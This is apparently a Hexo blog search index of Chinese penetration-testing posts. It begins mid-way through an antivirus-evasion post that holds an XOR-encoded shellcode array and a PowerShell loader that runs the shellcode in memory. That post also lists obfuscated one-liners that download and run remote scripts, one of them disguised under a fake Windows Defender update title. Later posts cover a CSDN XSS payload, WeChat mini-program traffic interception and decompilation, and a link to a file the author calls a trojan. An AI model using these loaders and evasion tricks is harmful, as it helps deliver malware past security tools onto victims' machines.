class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br><br>for ($x = <span class="hljs-number">0</span><span class="hljs-comment">; $x -lt $acode.Count; $x++) &#123;</span><br>$acode[$x] = $acode[$x] -bxor <span class="hljs-number">35</span><br>&#125;<br><br>$ava = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))<br>$abuffer = $ava.Invoke([IntPtr]<span class="hljs-number">::</span>Zero, $acode.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>[System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>Copy($acode, <span class="hljs-number">0</span>, $abuffer, $acode.length)<br><br>$arunme = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))<br>$arunme.Invoke([IntPtr]<span class="hljs-number">::</span>Zero)<br>&#x27;@<br><br>If ([IntPtr]<span class="hljs-number">::</span>size -eq <span class="hljs-number">8</span>) &#123;<br>start-job &#123; param($a) ie`x $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job<br>&#125;<br>else &#123;<br>i`ex $DoIt<br>&#125;<br></code></pre></td></tr></table></figure><p>我们再放到virustotal上面试试<br><img src="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png"><br>28/60，也就多绕过了4个防火墙<br>还是太菜了，手动的话，大概就这样了，下面贴一下在执行远程执行脚本时代码混淆，直接执行cs生成的语句杀软拦截的混淆操作</p><ol><li><p>使用Replace替换关键字部分字母，加上通过拆分后重新组合<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></p></li><li><p>使用powershell语言的特性来混淆代码</p></li></ol><p><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code></p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code></p><p><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code></p><p>管道输入流：</p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p><p>利用环境变量：</p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code></p><p>从其他进程获取参数：</p><p><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></p><hr><p>参考文章：<br><a href="https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw">https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次csdn的xss漏洞</title>
      <link href="2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/"/>
      <url>2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/07/06/uzAU24HoCVOB1kS.png"><br>csdn存在“猜你想搜”，并将其值存在placeholder中</p><p>在搜索xss相关信息后，将会推荐，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p>如下图所示<br><img src="https://s2.loli.net/2022/07/06/mvx5pW2u6fUTLi3.png"><br>xss的执行语句被放到了placeholder中，且没有过滤</p><p>存在xss漏洞，成果如下图所示</p><p><img src="https://s2.loli.net/2022/07/06/BAbNqDlcxWEdgFK.png"></p><blockquote><p>成果<br><a href="/files/csdn_xss.mp4">成果演示</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透3</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（反编译）"><a href="#微信小程序渗透测试（反编译）" class="headerlink" title="微信小程序渗透测试（反编译）"></a>微信小程序渗透测试（反编译）</h1><p>微信小程序反编译</p><a id="more"></a><p>代理的配置，成功抓包后，接下来就是对微信小程序的源码分析<br>首先下载微信<br>（注意：如果现在仍然挂着代理，将会无法正常下载微信）</p><p>我们在模拟器里登录微信，随便选择一个小程序打开</p><p>打开文件管理器，在会生成一个md5加密命名的文件夹（如果打开微信小程序过多，同时有多个文件夹不容易识别的情况，可以选择把文件夹所有内容删除掉，再去重新打开微信小程序，就会得到唯一一个MD5加密命名的文件夹）<br>在如图所示的路径下，能看到该小程序的文件夹<br><img src="https://s2.loli.net/2022/05/02/rkYKtlQaqmP8UH1.png"></p><p>一般都在/appbrand/pkg目录下，会看到带有后缀为wxapkg的文件<br>需要将其一一拷贝到本地主机下<br>注意：将整个文件夹复制大概率会使得文件管理系统停止工作而失败，所以需要一个一个文件的拷贝（确实麻烦！）</p><p>在夜神模拟器中，打开文件助手，找到模拟器与本地主机的共享文件夹<br><img src="https://s2.loli.net/2022/05/02/9oGFHnSsMeY4lUu.png"></p><p>开始拷贝文件（图形化交互确实慢。。）<br><img src="https://s2.loli.net/2022/05/02/kaIZgyobT6QuKth.png"></p><p>拷贝完文件之后，就是反编译了<br><a href="https://github.com/ezshine/wxapkg-convertor/releases"> GUI 界面的反编译工具</a></p><p>将文件拖入即可<br><img src="https://s2.loli.net/2022/05/02/Zng49N3rG5YmhQU.png"></p><p>所有的wxapkg文件编译完成<br><img src="https://s2.loli.net/2022/05/02/4oEBJD6SzH2LPuC.png"></p><p>接下来就是源码审计了<br><img src="https://s2.loli.net/2022/05/02/Shz3byPwKoZHd2l.png"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透2</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（抓包）"><a href="#微信小程序渗透测试（抓包）" class="headerlink" title="微信小程序渗透测试（抓包）"></a>微信小程序渗透测试（抓包）</h1><p>微信小程序抓包2</p><a id="more"></a><p>安卓7.0版本之后，模拟器无法正常下载证书，<br>导入的证书分为系统证书和用户证书。<br>之前导入的为用户证书，需要将其改为系统证书</p><p>使用openssl将证书格式转换<br>自行下载openssl（我这里使用的是kali自带的openssl）<br>查看是否已经安装openssl<br><img src="https://s2.loli.net/2022/05/01/BjFawSielCuV2ML.png"></p><p>将证书从der变为pem格式<br><img src="https://s2.loli.net/2022/05/01/SfeK6nDtphCFOZA.png"></p><p>打开夜神模拟器，根目录会有nox_adb.exe文件，用命令行去操控这个文件。（如果不是用夜神模拟器，也可以自己下载adb 工具，原理一样）<br><img src="https://s2.loli.net/2022/05/01/aSQtqwEZOBzTUIi.png"></p><p>从命令行里使用<br>首先检查其是否连接成功<br><img src="https://s2.loli.net/2022/05/01/kXPzrBoqd83ZFsi.png"><br>再切换到root模式，并改为可读写<br><img src="https://s2.loli.net/2022/05/01/m18nsXhLcHu3oiB.png"></p><p>查看该证书的hash值<br><img src="https://s2.loli.net/2022/05/01/aDwJW1LTkhKtF8p.png"></p><p>拷贝该证书，重命名为 hash结果里面的名称 <strong>注意这里要在名称后加.</strong><br><img src="https://s2.loli.net/2022/05/01/9E8fDIAmU2SsrQM.png"><br>这样就算完成了</p><p>PS:但是证书仍然会出现问题，目前还没找到解决的办法，但能成功抓包<br>所以还是建议使用7.0版本之前的安卓</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序渗透1</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序渗透测试（抓包）"><a href="#微信小程序渗透测试（抓包）" class="headerlink" title="微信小程序渗透测试（抓包）"></a>微信小程序渗透测试（抓包）</h1><p>考虑到微信小程序大多是外包开发，且高校的小程序部分为学生开发，相比于站点，安全性较低，尝试去对微信小程序进行渗透</p><a id="more"></a><p>这是基于安卓7.0之前<br><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">7.0之后看这里</a></p><p>首先准备好一个安卓模拟器，我在这里使用的是夜神模拟器</p><p><img src="https://s2.loli.net/2022/05/01/KMcdE8il9Yu6NPW.png"><br>首先切换到root模式</p><p>给burpsuite加上本地IP的端口监听，如果是在虚拟机上实现，则加上对应的IP端口<br><img src="https://s2.loli.net/2022/05/01/gdYsDOaTp1z6tJn.png"></p><p>打开模拟器的网络连接设置，长按WiredSSID，修改网络，进入高级设置<br><img src="https://s2.loli.net/2022/05/01/51PevgYNJSsj9kt.png"></p><p>设置为手动代理，加上与burpsuite上相对应的IP以及端口号<br><img src="https://s2.loli.net/2022/05/01/8N2LTMwHvJIUsCW.png"></p><p>从浏览器打开相应的IP以及端口，下载相应的burpsuite的证书<br>（这里只是为了下载相应的证书，也可以从本地下载下来，再放入到模拟器中）<br><img src="https://s2.loli.net/2022/05/01/usxnIrJd4vCVqNA.png"></p><p>下载完成后，打开模拟器自带的文件管理系统，下载的证书将在download中<br><strong>这里注意！下载下来的证书很可能是灰色的，需要将后缀改为crt，der后缀文件可能存在识别错误的问题</strong><br><strong>其他问题：可能存在证书在download目录下也无法正常导入，需要将其移入其他目录（本人再这里未遇到该问题）</strong><br><img src="https://s2.loli.net/2022/05/01/lI4A7bcEVMZ2Nso.png"></p><p>成功导入证书后就完成了<br>我们打开百度测试一下<br><img src="https://s2.loli.net/2022/05/01/IiamvHD4TNAMSZP.png" alt="成功抓包"></p><p><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">如果提示证书安全问题看这里</a></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome</title>
      <link href="2021/12/04/Welcome/"/>
      <url>2021/12/04/Welcome/</url>
      
        <content type="html"><![CDATA[<p><img src="/files/Welcome.jpg" alt="Welcome to my blog"><br><a href="/files/1111.exe">这是个🐎</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The first try</title>
      <link href="2020/12/17/The%20first%20try/"/>
      <url>2020/12/17/The%20first%20try/</url>
      
        <content type="html"><![CDATA[<h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><blockquote><p>引用</p></blockquote><hr><p><em>斜体</em><br><strong>加粗</strong></p><p>！<a href="%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5">说明</a></p><p><a href="http://baidu.com/">百度</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> i=<span class="hljs-string">&quot;代码块&quot;</span><br></code></pre></td></tr></table></figure><ul><li>列表</li><li>列表</li></ul><ol><li>列表</li><li>列表</li></ol><table><thead><tr><th align="center">表头</th><th align="left">表头</th><th align="right">表头</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">2</td><td align="right">3</td></tr></tbody></table><p><del>删除</del></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/16/hello-world/"/>
      <url>2020/12/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
